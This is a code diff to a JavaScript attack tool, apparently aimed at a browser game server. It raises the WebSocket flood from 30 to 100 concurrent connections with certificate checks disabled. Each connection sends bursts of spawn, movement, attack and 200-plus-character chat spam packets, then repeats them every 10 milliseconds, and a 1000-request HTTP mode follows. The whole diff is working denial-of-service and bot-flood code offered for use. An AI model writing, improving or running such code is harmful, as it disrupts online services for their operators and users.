@@ -27,38 +27,80 @@ function parseTarget(input) {
 }
 
 const attackModes = {
-  async ws(target, count = 30) {
+  async ws(target, count = 100) {
     this.connections = new Set();
+    let succeeded = 0;
 
-    for (let i = 0; i < count && !this.aborted; i++) {
+    const spawnPacket = msgpack.encode(['sp', [{ name: 'x', moofoll: 'x', skin: 0 }]]);
+    const movePacket = () => msgpack.encode(['9', [Math.random() * Math.PI * 2]]);
+    const chatPacket = () => msgpack.encode(['6', 'A'.repeat(200 + Math.floor(Math.random() * 50))]);
+    const attackPacket = () => msgpack.encode(['c', [Math.random() * 100, Math.random() * 100]]);
+
+    const connectOne = (i) => new Promise((resolve) => {
       try {
         const ws = new WebSocket(target.raw, {
           rejectUnauthorized: false,
-          handshakeTimeout: 10000,
+          handshakeTimeout: 8000,
         });
         this.connections.add(ws);
 
         ws.on('open', () => {
-          log(`WS#${i} connected`);
+          succeeded++;
+          log(`WS#${i} connected (total: ${succeeded})`);
+          for (let b = 0; b < 10; b++) {
+            try {
+              ws.send(spawnPacket);
+              ws.send(movePacket());
+              ws.send(chatPacket());
+              ws.send(attackPacket());
+            } catch (e) {}
+          }
           const interval = setInterval(() => {
             if (ws.readyState !== WebSocket.OPEN) { clearInterval(interval); return; }
             try {
-              ws.send(msgpack.encode(['9', [Math.random() * Math.PI * 2]]));
-              ws.send(msgpack.encode(['6', 'A'.repeat(50)]));
+              ws.send(movePacket());
+              ws.send(chatPacket());
+              ws.send(attackPacket());
             } catch (e) {}
-          }, 12);
+          }, 10);
           ws._interval = interval;
+          resolve(true);
         });
 
-        ws.on('close', () => { clearInterval(ws._interval); this.connections.delete(ws); });
-        ws.on('error', () => { this.connections.delete(ws); });
+        ws.on('close', (code) => {
+          clearInterval(ws._interval);
+          this.connections.delete(ws);
+          if (code !== 1000) log(`WS#${i} closed code=${code}`);
+          resolve(false);
+        });
+        ws.on('error', (e) => {
+          this.connections.delete(ws);
+          resolve(false);
+        });
 
-        if (i > 0 && i % 20 === 0) await new Promise(r => setTimeout(r, 200));
+        setTimeout(() => {
+          if (ws.readyState === WebSocket.CONNECTING) {
+            ws.close();
+            this.connections.delete(ws);
+            resolve(false);
+          }
+        }, 10000);
       } catch (e) {
-        log(`WS#${i} fail:`, e.message);
+        resolve(false);
       }
+    });
+
+    const batchSize = 15;
+    for (let i = 0; i < count && !this.aborted; i += batchSize) {
+      const batch = [];
+      for (let j = i; j < Math.min(i + batchSize, count); j++) {
+        batch.push(connectOne(j));
+      }
+      await Promise.all(batch);
+      if (!this.aborted && i + batchSize < count) await new Promise(r => setTimeout(r, 300));
     }
-    return this.connections.size;
+
+    return { connected: succeeded, attempted: count };
   },
 
   async http(target, count = 1000) {
